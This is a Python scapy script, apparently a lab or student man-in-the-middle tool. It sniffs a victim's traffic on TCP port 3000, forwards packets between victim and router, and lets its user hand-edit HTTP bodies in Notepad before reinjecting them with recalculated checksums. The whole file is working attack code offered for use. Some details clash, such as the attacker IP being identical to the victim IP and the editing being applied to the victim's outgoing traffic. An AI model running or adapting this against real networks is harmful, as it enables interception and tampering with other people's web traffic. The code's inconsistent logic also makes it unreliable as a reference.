from time import sleep
from scapy.all import *
from scapy.layers.inet import IP, TCP, getmacbyip
from scapy.layers.http import HTTPRequest, HTTPResponse
import html
import click

# Define the victim's IP address
victim_ip = "192.168.3.102"
hacker_ip = "192.168.3.102"
router_ip = "192.168.3.109"

# Dictionary to store TCP streams
http_responses = {}

# Define network information
router_mac = getmacbyip(router_ip)  # "10:be:f5:d5:57:90"

def packet_handler(packet):
    shwmsg = False
    if packet.haslayer(IP):
        if packet[IP].src == victim_ip and packet[IP].dst == router_ip:
            shwmsg = True
            print("====================================")
            print("PACKET CAPTURED FROM VICTIM")
            packet = packet_callback(packet)

        elif packet[IP].src == router_ip:
            shwmsg = True
            print("=====================================")
            print("PACKET CAPTURED FROM WEBSERVER")
            if packet.haslayer(HTTPResponse):
                packet = packet_sendtrough(packet)

    # Send the modified packet back to the victim
    send(packet, verbose=False)
    if shwmsg:
        print(f"Forwarded packet from {packet[IP].src} to {packet[IP].dst}")
        print("========================================================================")
    return

def format_html(html_content):
    # Use html.unescape to handle HTML entities for better readability
    return html.unescape(html_content)

def modify_packet(packet):
    if packet.haslayer(HTTPRequest):
        http_request = packet[HTTPRequest]
        print(f"HTTP Request: {http_request.Method.decode()} {http_request.Path.decode()}")

    if packet.haslayer(TCP):
        tcp = packet[TCP]
        stream_index = (tcp.sport, tcp.dport, tcp.seq, tcp.ack)

        # Reassemble TCP stream
        if stream_index not in http_responses:
            http_responses[stream_index] = b""
            print('oke bij response')

        if packet.haslayer(Raw):
            payload = packet[Raw].load
            http_responses[stream_index] += payload
            print('oke bij raw')

            try:
                print('oke bij try')
                # Attempt to decode and find the HTTP response in the reassembled stream
                payload_decoded = http_responses[stream_index].decode(errors='ignore')
                headers_end_idx = payload_decoded.find('\r\n\r\n')
                if headers_end_idx != -1:
                    entity_body = payload_decoded[headers_end_idx + 4:]
                    # Format and print HTML content
                    formatted_entity_body = format_html(entity_body)
                    print("HTTP Response Entity Body (Formatted HTML):")
                    print(formatted_entity_body)
                    new_entity_body = click.edit(formatted_entity_body, editor='notepad')
                    # Clear the stored response after printing
                    del http_responses[stream_index]

                    # Modify packet payload with new HTML content
                    new_payload = payload_decoded[:headers_end_idx + 4] + new_entity_body
                    packet[Raw].load = new_payload.encode()

                    # Recalculate checksums
                    del packet[IP].chksum
                    del packet[TCP].chksum

                    packet.show()

                    return packet

                else:
                    print("Headers end not found in payload.")
                    print(payload_decoded)
                    return packet
            except UnicodeDecodeError as e:
                print(f"Decoding error: {e}")
    return packet

def packet_callback(packet):
    print("========================================================================")
    print(f"Captured packet from {packet[IP].src} to {packet[IP].dst}")

    # Modify the packet's destination to the webserver IP
    packet[IP].dst = router_ip
    packet = modify_packet(packet)

    # Print the packets load
    if packet.haslayer(Raw):
        payload = packet[Raw].load
        http_headers = payload.decode('utf-8', errors='ignore')
        print(f"HTTP Headers:\n{http_headers}")

    return packet

def packet_sendtrough(packet):
    print("========================================================================")
    print(f"Captured packet from {packet[IP].src} to {packet[IP].dst}")

    # Modify the packet's destination to the victim IP
    packet[IP].dst = victim_ip

    return packet

# Sniff packets on the network and use packet_callback to process them
if __name__ == "__main__":
    while True:
        sniff(prn=packet_handler, filter='tcp port 3000', store=0)

        frequency = 7
        sleep(frequency)
